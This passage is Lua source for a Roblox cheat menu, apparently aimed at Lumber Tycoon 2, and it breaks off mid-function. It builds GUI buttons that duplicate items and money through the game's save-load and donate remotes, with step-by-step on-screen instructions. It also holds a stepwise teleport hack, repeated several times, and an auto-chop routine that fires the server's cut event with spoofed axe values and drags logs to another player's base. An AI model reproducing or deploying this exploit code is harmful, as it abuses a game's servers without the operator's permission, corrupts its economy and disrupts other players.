ItemDupe.BackgroundColor3 = Color3.new(0, 0, 0)
ItemDupe.BackgroundTransparency = 0.6
ItemDupe.BorderColor3 = Color3.new(1, 0, 0)
ItemDupe.Position = UDim2.new(0, 200, 0, 359)
ItemDupe.Size = UDim2.new(0, 160, 0, 20)
ItemDupe.Font = Enum.Font.Fantasy
ItemDupe.Text = "Dupe Items"
ItemDupe.TextColor3 = Color3.new(1, 1, 1)
ItemDupe.TextSize = 14
ItemDupe.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(game.Players.LocalPlayer.CurrentSaveSlot.Value)
end)

InfoText5 = Instance.new("TextLabel")
InfoText5.Name = "InfoText2"
InfoText5.Parent = PlayerFrame
InfoText5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText5.BorderColor3 = Color3.new(0, 0, 0)
InfoText5.BackgroundTransparency = 0
InfoText5.Position = UDim2.new(0, 23, 0, 310)
InfoText5.Size = UDim2.new(0, 150, 0, 150)
InfoText5.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText5.Font = Enum.Font.Fantasy
InfoText5.Text =  "Dupe Mode\n\n1.Load Your Slot (Wait About 60s) Press Dupe Mode.\n2.WhiteList Player\n3.Copy items to another player \n4.Other player reloads.\n5.You reload."
InfoText5.TextSize = 14
InfoText5.TextWrapped = true
InfoText5.Visible = false

ItemDupe.MouseEnter:connect(function()
InfoText5.Visible = true
AIntroImage2.Visible = false
AIntroImage3.Visible = false
end)

ItemDupe.MouseLeave:connect(function()
InfoText5.Visible = false
AIntroImage2.Visible = true
AIntroImage3.Visible = true
end)

DMoney = Instance.new("TextButton")
DMoney.Name = "DMoney"
DMoney.Parent = PlayerFrame
DMoney.BackgroundColor3 = Color3.new(0, 0, 0)
DMoney.BackgroundTransparency = 0.6
DMoney.BorderColor3 = Color3.new(1, 0, 0)
DMoney.Position = UDim2.new(0, 200, 0, 382)
DMoney.Size = UDim2.new(0, 160, 0, 20)
DMoney.Font = Enum.Font.Fantasy
DMoney.Text = "Dupe Money"
DMoney.TextColor3 = Color3.new(1, 1, 1)
DMoney.TextSize = 14
DMoney.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.Transactions.ClientToServer.Donate:InvokeServer(game.Players.LocalPlayer, game.Players.LocalPlayer.leaderstats.Money.Value, 1)
end)

InfoText3 = Instance.new("TextLabel")
InfoText3.Name = "InfoText2"
InfoText3.Parent = PlayerFrame
InfoText3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText3.BorderColor3 = Color3.new(0, 0, 0)
InfoText3.BackgroundTransparency = 0
InfoText3.Position = UDim2.new(0, 23, 0, 310)
InfoText3.Size = UDim2.new(0, 150, 0, 150)
InfoText3.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText3.Font = Enum.Font.Fantasy
InfoText3.Text = "Dupe Money\n\n1.Load Your Slot.\n2.Press Dupe Money.\n3.Press Load Slot the slot that is loaded.\n4.Wait about two mins."
InfoText3.TextSize = 14
InfoText3.TextWrapped = true
InfoText3.Visible = false

DMoney.MouseEnter:connect(function()
InfoText3.Visible = true
AIntroImage2.Visible = false
AIntroImage3.Visible = false
end)

DMoney.MouseLeave:connect(function()
InfoText3.Visible = false
AIntroImage2.Visible = true
AIntroImage3.Visible = true
end)

Base = Instance.new("ScrollingFrame")
Base.Name = "MakeBase"
Base.Parent = PlayerFrame
Base.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Base.Position = UDim2.new(0, 200, 0, 405)
Base.BackgroundTransparency = 0.5
Base.BorderColor3 = Color3.new(0, 0, 0)
Base.Size = UDim2.new(0, 160, 0, 50)
Base.CanvasPosition = Vector2.new(0,0)
Base.CanvasSize = UDim2.new(0, 0, 0, 165)
Base.Visible = true

CurrentSlot = Instance.new("TextButton")
CurrentSlot.Name = "CurrentSlot"
CurrentSlot.Parent = Base
CurrentSlot.BackgroundColor3 = Color3.new(0, 0, 0)
CurrentSlot.BackgroundTransparency = 0.6
CurrentSlot.BorderColor3 = Color3.new(1, 0, 0)
CurrentSlot.Position = UDim2.new(0, 5, 0, 3)
CurrentSlot.Size = UDim2.new(0, 160, 0, 20)
CurrentSlot.Font = Enum.Font.Fantasy
CurrentSlot.Text = "Load Current Slot"
CurrentSlot.TextColor3 = Color3.new(0, 1, 0)
CurrentSlot.TextSize = 14
CurrentSlot.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(game.Players.LocalPlayer.CurrentSaveSlot.Value)
end)

Slot = Instance.new("TextButton")
Slot.Name = "Slot"
Slot.Parent = Base
Slot.BackgroundColor3 = Color3.new(0, 0, 0)
Slot.BackgroundTransparency = 0.6
Slot.BorderColor3 = Color3.new(1, 0, 0)
Slot.Position = UDim2.new(0, 5, 0, 26)
Slot.Size = UDim2.new(0, 160, 0, 20)
Slot.Font = Enum.Font.Fantasy
Slot.Text = "Load Slot 1 "
Slot.TextColor3 = Color3.new(0, 1, 0)
Slot.TextSize = 14
Slot.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(1)
end)

Slot1 = Instance.new("TextButton")
Slot1.Name = "Slot"
Slot1.Parent = Base
Slot1.BackgroundColor3 = Color3.new(0, 0, 0)
Slot1.BackgroundTransparency = 0.6
Slot1.BorderColor3 = Color3.new(1, 0, 0)
Slot1.Position = UDim2.new(0, 5, 0, 49)
Slot1.Size = UDim2.new(0, 160, 0, 20)
Slot1.Font = Enum.Font.Fantasy
Slot1.Text = "Load Slot 2 "
Slot1.TextColor3 = Color3.new(0, 1, 0)
Slot1.TextSize = 14
Slot1.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(2)
end)

Slot2 = Instance.new("TextButton")
Slot2.Name = "Slot"
Slot2.Parent = Base
Slot2.BackgroundColor3 = Color3.new(0, 0, 0)
Slot2.BackgroundTransparency = 0.6
Slot2.BorderColor3 = Color3.new(1, 0, 0)
Slot2.Position = UDim2.new(0, 5, 0, 72)
Slot2.Size = UDim2.new(0, 160, 0, 20)
Slot2.Font = Enum.Font.Fantasy
Slot2.Text = "Load Slot 3 "
Slot2.TextColor3 = Color3.new(0, 1, 0)
Slot2.TextSize = 14
Slot2.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(3)
end)

Slot3 = Instance.new("TextButton")
Slot3.Name = "Slot"
Slot3.Parent = Base
Slot3.BackgroundColor3 = Color3.new(0, 0, 0)
Slot3.BackgroundTransparency = 0.6
Slot3.BorderColor3 = Color3.new(1, 0, 0)
Slot3.Position = UDim2.new(0, 5, 0, 95)
Slot3.Size = UDim2.new(0, 160, 0, 20)
Slot3.Font = Enum.Font.Fantasy
Slot3.Text = "Load Slot 4 "
Slot3.TextColor3 = Color3.new(0, 1, 0)
Slot3.TextSize = 14
Slot3.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(4)
end)

Slot4 = Instance.new("TextButton")
Slot4.Name = "Slot"
Slot4.Parent = Base
Slot4.BackgroundColor3 = Color3.new(0, 0, 0)
Slot4.BackgroundTransparency = 0.6
Slot4.BorderColor3 = Color3.new(1, 0, 0)
Slot4.Position = UDim2.new(0, 5, 0, 118)
Slot4.Size = UDim2.new(0, 160, 0, 20)
Slot4.Font = Enum.Font.Fantasy
Slot4.Text = "Load Slot 5 "
Slot4.TextColor3 = Color3.new(0, 1, 0)
Slot4.TextSize = 14
Slot4.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(5)
end)

Slot5 = Instance.new("TextButton")
Slot5.Name = "Slot"
Slot5.Parent = Base
Slot5.BackgroundColor3 = Color3.new(0, 0, 0)
Slot5.BackgroundTransparency = 0.6
Slot5.BorderColor3 = Color3.new(1, 0, 0)
Slot5.Position = UDim2.new(0, 5, 0, 141)
Slot5.Size = UDim2.new(0, 160, 0, 20)
Slot5.Font = Enum.Font.Fantasy
Slot5.Text = "Load Slot 6 "
Slot5.TextColor3 = Color3.new(0, 1, 0)
Slot5.TextSize = 14
Slot5.MouseButton1Down:connect(function()
makesound("rbxassetid://156785206")
game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(6)
end)

TeleportA = Instance.new("ImageButton")
TeleportA.Name = "Teleport"
TeleportA.Parent = Picker
TeleportA.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
TeleportA.BorderColor3 = Color3.new(0, 0, 0)
TeleportA.Position = UDim2.new(0, 15, 0,90)
TeleportA.Size = UDim2.new(0, 80, 0, 80)
TeleportA.ZIndex = 3
TeleportA.Image = "rbxassetid://4892951560"
TeleportA.ScaleType = Enum.ScaleType.Crop
TeleportA.MouseButton1Click:Connect(function()
CurrentItem.Image = "rbxassetid://4892951560"
  makesound("rbxassetid://156785206")
AIntroImage.Visible = false
AIntroImage1.Visible = false
AIntroImage2.Visible = false
AIntroImage3.Visible = false
TimesFrame.Visible = true
end)

Waypoints = Instance.new("ScrollingFrame")
Waypoints.Name = "Waypoints"
Waypoints.Parent = MenuFrame
Waypoints.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Waypoints.BackgroundTransparency = 0.5
Waypoints.BorderColor3 = Color3.new(0, 0, 0)
Waypoints.Size = UDim2.new(0, 170, 0, 465)
Waypoints.CanvasPosition = Vector2.new(0,0)
Waypoints.CanvasSize = UDim2.new(0, 0, 0, 650)
Waypoints.Visible = false

WaypointsA = Instance.new("TextLabel")
WaypointsA.Name = "WaypointsA"
WaypointsA.Parent = Waypoints
WaypointsA.BackgroundColor3 = Color3.new(255, 0, 0)
WaypointsA.BackgroundTransparency = 0
WaypointsA.BorderColor3 = Color3.fromRGB(151, 0, 0)
WaypointsA.Position = UDim2.new(0, 5, 0, 3)
WaypointsA.Size = UDim2.new(0, 148, 0, 20)
WaypointsA.Font = Enum.Font.Fantasy
WaypointsA.Text = "--Waypoints--"
WaypointsA.TextColor3 = Color3.new(1, 1, 1)
WaypointsA.TextSize = 14

SpawnPoint = Instance.new("TextButton")
SpawnPoint.Name = "SpawnPoint"
SpawnPoint.Parent = Waypoints
SpawnPoint.BackgroundColor3 = Color3.new(0, 0, 0)
SpawnPoint.BackgroundTransparency = 0.6
SpawnPoint.BorderColor3 = Color3.fromRGB(151, 0, 0)
SpawnPoint.Position = UDim2.new(0, 5, 0, 26)
SpawnPoint.Size = UDim2.new(0, 148, 0, 20)
SpawnPoint.Font = Enum.Font.Fantasy
SpawnPoint.Text = "Spawn"
SpawnPoint.TextColor3 = Color3.new(1, 1, 1)
SpawnPoint.TextSize = 14
SpawnPoint.MouseButton1Down:connect(function()
function Teleport(XP,YP,ZP)
-- Config How Many Blocks It Will Tp You Untill The Final Destination:
local XTpEvery = 15
local YTpEvery = 15
local ZTpEvery = 15
--Time to Tp Every:
local Timer = 0.001
local pos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart
if pos.Position.X < XP then
for x = pos.Position.X,XP,XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for x = pos.Position.X,XP,-XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Z < ZP then
for z = pos.Position.Z,ZP,ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for z = pos.Position.Z,ZP,-ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Y < YP then
for High = pos.Position.Y,YP,YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for High = pos.Position.Y,YP,-YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(XP + 5,YP,ZP + 5)
end
Teleport(155, 5, 74)
end)

InfoText39 = Instance.new("ImageLabel")
InfoText39.Name = "ImageLabel"
InfoText39.Parent = MainFrame
InfoText39.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText39.Position = UDim2.new(0, 185, 0, 180)
InfoText39.Size = UDim2.new(0, 200, 0, 100)
InfoText39.Image = "rbxassetid://4501663226"
InfoText39.Visible = false

SpawnPoint.MouseEnter:connect(function()
InfoText39.Visible = true
end)

SpawnPoint.MouseLeave:connect(function()
InfoText39.Visible = false
end)

PlotTp = Instance.new("TextButton")
PlotTp.Name = "PlotTp"
PlotTp.Parent = Waypoints
PlotTp.BackgroundColor3 = Color3.new(0, 0, 0)
PlotTp.BackgroundTransparency = 0.6
PlotTp.BorderColor3 = Color3.fromRGB(151, 0, 0)
PlotTp.Position = UDim2.new(0, 5, 0, 49)
PlotTp.Size = UDim2.new(0, 148, 0, 20)
PlotTp.Font = Enum.Font.Fantasy
PlotTp.Text = "Tp Player Base"
PlotTp.TextColor3 = Color3.new(1, 1, 1)
PlotTp.TextSize = 14

InfoText40 = Instance.new("ImageLabel")
InfoText40.Name = "ImageLabel"
InfoText40.Parent = MainFrame
InfoText40.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText40.Position = UDim2.new(0, 185, 0, 180)
InfoText40.Size = UDim2.new(0, 200, 0, 100)
InfoText40.Image = "rbxassetid://4501662682"
InfoText40.Visible = false
        Instance.new('RemoteEvent', game:service'ReplicatedStorage'.Interaction).Name = "Ban"
PlotTp.MouseEnter:connect(function()
InfoText40.Visible = true
end)

PlotTp.MouseLeave:connect(function()
InfoText40.Visible = false
end)

PlyrSel = Instance.new("TextLabel")
PlyrSel.Name = "PlyrSel"
PlyrSel.Parent = Waypoints
PlyrSel.BackgroundColor3 = Color3.new(0, 0, 0)
PlyrSel.BackgroundTransparency = 0.6
PlyrSel.BorderColor3 = Color3.fromRGB(151, 0, 0)
PlyrSel.Position = UDim2.new(0, 5, 0, 72)
PlyrSel.Size = UDim2.new(0, 148, 0, 20)
PlyrSel.Font = Enum.Font.Fantasy
PlyrSel.Text = "Select a player"
PlyrSel.TextColor3 = Color3.new(0, 1, 0)
PlyrSel.TextSize = 14
PlyrSel.TextWrapped = true

Player1 = Instance.new("TextButton")
Player1.Name = "Player1"
Player1.Parent = Waypoints
Player1.BackgroundColor3 = Color3.new(0, 0, 0)
Player1.BackgroundTransparency = 0.6
Player1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Player1.Position = UDim2.new(0, 5, 0, 95)
Player1.Size = UDim2.new(0, 148, 0, 20)
Player1.Font = Enum.Font.Fantasy
Player1.Text = ""
Player1.TextColor3 = Color3.fromRGB(245, 205, 48)
Player1.TextSize = 14
Player1.TextWrapped = true

Player2 = Instance.new("TextButton")
Player2.Name = "Player2"
Player2.Parent = Waypoints
Player2.BackgroundColor3 = Color3.new(0, 0, 0)
Player2.BackgroundTransparency = 0.6
Player2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Player2.Position = UDim2.new(0, 5, 0, 118)
Player2.Size = UDim2.new(0, 148, 0, 20)
Player2.Font = Enum.Font.Fantasy
Player2.Text = ""
Player2.TextColor3 = Color3.fromRGB(245, 205, 48)
Player2.TextSize = 14
Player2.TextWrapped = true

Player3 = Instance.new("TextButton")
Player3.Name = "Player3"
Player3.Parent = Waypoints
Player3.BackgroundColor3 = Color3.new(0, 0, 0)
Player3.BackgroundTransparency = 0.6
Player3.BorderColor3 = Color3.fromRGB(151, 0, 0)
Player3.Position = UDim2.new(0, 5, 0, 141)
Player3.Size = UDim2.new(0, 148, 0, 20)
Player3.Font = Enum.Font.Fantasy
Player3.Text = ""
Player3.TextColor3 = Color3.fromRGB(245, 205, 48)
Player3.TextSize = 14
Player3.TextWrapped = true

Player4 = Instance.new("TextButton")
Player4.Name = "Player4"
Player4.Parent = Waypoints
Player4.BackgroundColor3 = Color3.new(0, 0, 0)
Player4.BackgroundTransparency = 0.6
Player4.BorderColor3 = Color3.fromRGB(151, 0, 0)
Player4.Position = UDim2.new(0, 5, 0, 164)
Player4.Size = UDim2.new(0, 148, 0, 20)
Player4.Font = Enum.Font.Fantasy
Player4.Text = ""
Player4.TextColor3 = Color3.fromRGB(245, 205, 48)
Player4.TextSize = 14
Player4.TextWrapped = true

Player5 = Instance.new("TextButton")
Player5.Name = "Player5"
Player5.Parent = Waypoints
Player5.BackgroundColor3 = Color3.new(0, 0, 0)
Player5.BackgroundTransparency = 0.6
Player5.BorderColor3 = Color3.fromRGB(151, 0, 0)
Player5.Position = UDim2.new(0, 5, 0, 187)
Player5.Size = UDim2.new(0, 148, 0, 20)
Player5.Font = Enum.Font.Fantasy
Player5.Text = ""
Player5.TextColor3 = Color3.fromRGB(245, 205, 48)
Player5.TextSize = 14
Player5.TextWrapped = true

Player6 = Instance.new("TextButton")
Player6.Name = "Player6"
Player6.Parent = Waypoints
Player6.BackgroundColor3 = Color3.new(0, 0, 0)
Player6.BackgroundTransparency = 0.6
Player6.BorderColor3 = Color3.fromRGB(151, 0, 0)
Player6.Position = UDim2.new(0, 5, 0, 210)
Player6.Size = UDim2.new(0, 148, 0, 20)
Player6.Font = Enum.Font.Fantasy
Player6.Text = ""
Player6.TextColor3 = Color3.fromRGB(245, 205, 48)
Player6.TextSize = 14
Player6.TextWrapped = true

 --- Player Tp ---

	local buttons = {
		Player1,
		Player2,
		Player3,
		Player4,
		Player5,
		Player6
	}
	spawn(function()
		while true do
			Player1.Text = ""
			Player2.Text = ""
			Player3.Text = ""
			Player4.Text = ""
			Player5.Text = ""
			Player6.Text = ""
			for i, v in pairs(game.Players:GetChildren()) do
				buttons[i].Text = v.Name
				buttons[i].Visible = true
			end
			wait(0.5)
		end
	end)

	Player1.MouseButton1Down:connect(function()
      PlyrSel.Text = Player1.Text
    end)
    Player2.MouseButton1Down:connect(function()
      PlyrSel.Text = Player2.Text
    end)
    Player3.MouseButton1Down:connect(function()
      PlyrSel.Text = Player3.Text
    end)
    Player4.MouseButton1Down:connect(function()
       PlyrSel.Text = Player4.Text
    end)
    Player5.MouseButton1Down:connect(function()
      PlyrSel.Text = Player5.Text
    end)
    Player6.MouseButton1Down:connect(function()
      PlyrSel.Text = Player6.Text
    end)

function Teleport(XP,YP,ZP)
-- Config How Many Blocks It Will Tp You Untill The Final Destination:
local XTpEvery = 15
local YTpEvery = 15
local ZTpEvery = 15
--Time to Tp Every:
local Timer = 0.001
local pos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart
if pos.Position.X < XP then
for x = pos.Position.X,XP,XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for x = pos.Position.X,XP,-XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Z < ZP then
for z = pos.Position.Z,ZP,ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for z = pos.Position.Z,ZP,-ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Y < YP then
for High = pos.Position.Y,YP,YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for High = pos.Position.Y,YP,-YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(XP + 5,YP,ZP + 5)
end

function GetTree(Wood, PlayerName, Quantitys)
local Counter = 0
local HitPoints={
['Beesaxe']= 1.4;
['AxeAmber']= 3.39;
['ManyAxe']= 10.2;
['BasicHatchet']= 0.2;
['Axe1']= 0.55;
['Axe2']= 0.93;
['AxeAlphaTesters']= 1.5;
['Rukiryaxe']= 1.68;
['Axe3']= 1.45;
['AxeBetaTesters']= 1.45;
['FireAxe']= 0.6;
['SilverAxe']= 1.6;
['EndTimesAxe']= 1.58;
['AxeChicken']= 0.9;
['CandyCaneAxe']= 0;
['AxeTwitter']= 1.65
}
function axe(Val)
local A_1 = Val.CutEvent
local A_2 = 
{
	["tool"] = game.Players.LocalPlayer.Character:FindFirstChild("Tool"), 
	["faceVector"] = Vector3.new(0, 0, -1), 
	["height"] = 0.3, 
	["sectionId"] = 1, 
	["hitPoints"] = HitPoints[game.Players.LocalPlayer.Character:FindFirstChild("Tool").ToolName.Value], 
	["cooldown"] = 0.112, 
	["cuttingClass"] = "Axe"
}
local Event = game:GetService("ReplicatedStorage").Interaction.RemoteProxy
Event:FireServer(A_1, A_2)
end
local Ps = nil
for i, v in pairs(game.Workspace.Properties:GetChildren()) do
if v.Owner.Value == game.Players[PlayerName] then
Ps = v.OriginSquare.Position + Vector3.new(0,30,0)
end
end
for i,v in pairs(game.Workspace:GetDescendants()) do
    if v:FindFirstChild("TreeClass") and v.TreeClass.Value == Wood and v.Name == "Model" then
    Teleport(v.WoodSection.Position.X,v.WoodSection.Position.Y,v.WoodSection.Position.Z)
    for i=1,50 do
    wait(0.0001)
    axe(v)
    end
for i,v in pairs(Workspace.LogModels:GetChildren()) do
if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer and v.TreeClass.Value == Wood then
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
v:MoveTo(Ps)
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
v:MoveTo(Ps)
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
v:MoveTo(Ps)
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
end
end
Counter = Counter + 1
if Quantitys - Counter == 0 then
print("Breaked")
break
end
wait(0.2)
end
end
wait(0.2)
for i, v in pairs(game.Workspace.Properties:GetChildren()) do
if v.Owner.Value == game.Players[PlayerName] then
Teleport(v.OriginSquare.Position.X, v.OriginSquare.Position.Y + 3.2, v.OriginSquare.Position.Z)
end
end
end
PlotTp.MouseButton1Down:connect(function()
GetTree("play", PlyrSel.Text)
end)

ShopsTitle = Instance.new("TextLabel")
ShopsTitle.Name = "ShopsTitle"
ShopsTitle.Parent = Waypoints
ShopsTitle.BackgroundColor3 = Color3.new(255, 0, 0)
ShopsTitle.BackgroundTransparency = 0
ShopsTitle.BorderColor3 = Color3.fromRGB(151, 0, 0)
ShopsTitle.Position = UDim2.new(0, 5, 0, 233)
ShopsTitle.Size = UDim2.new(0, 148, 0, 20)
ShopsTitle.Font = Enum.Font.Fantasy
ShopsTitle.Text = "---- Shops ----"
ShopsTitle.TextColor3 = Color3.new(1, 1, 1)
ShopsTitle.TextSize = 14

WoodRUs = Instance.new("TextButton")
WoodRUs.Name = "WoodRUs"
WoodRUs.Parent = Waypoints
WoodRUs.BackgroundColor3 = Color3.new(0, 0, 0)
WoodRUs.BackgroundTransparency = 0.6
WoodRUs.BorderColor3 = Color3.fromRGB(151, 0, 0)
WoodRUs.Position = UDim2.new(0, 5, 0, 256)
WoodRUs.Size = UDim2.new(0, 148, 0, 20)
WoodRUs.Font = Enum.Font.Fantasy
WoodRUs.Text = "Wood R Us"
WoodRUs.TextColor3 = Color3.new(1, 1, 1)
WoodRUs.TextSize = 14
WoodRUs.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")

function Teleport(XP,YP,ZP)
-- Config How Many Blocks It Will Tp You Untill The Final Destination:
local XTpEvery = 15
local YTpEvery = 15
local ZTpEvery = 15
--Time to Tp Every:
local Timer = 0.001
local pos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart
if pos.Position.X < XP then
for x = pos.Position.X,XP,XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for x = pos.Position.X,XP,-XTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Z < ZP then
for z = pos.Position.Z,ZP,ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for z = pos.Position.Z,ZP,-ZTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
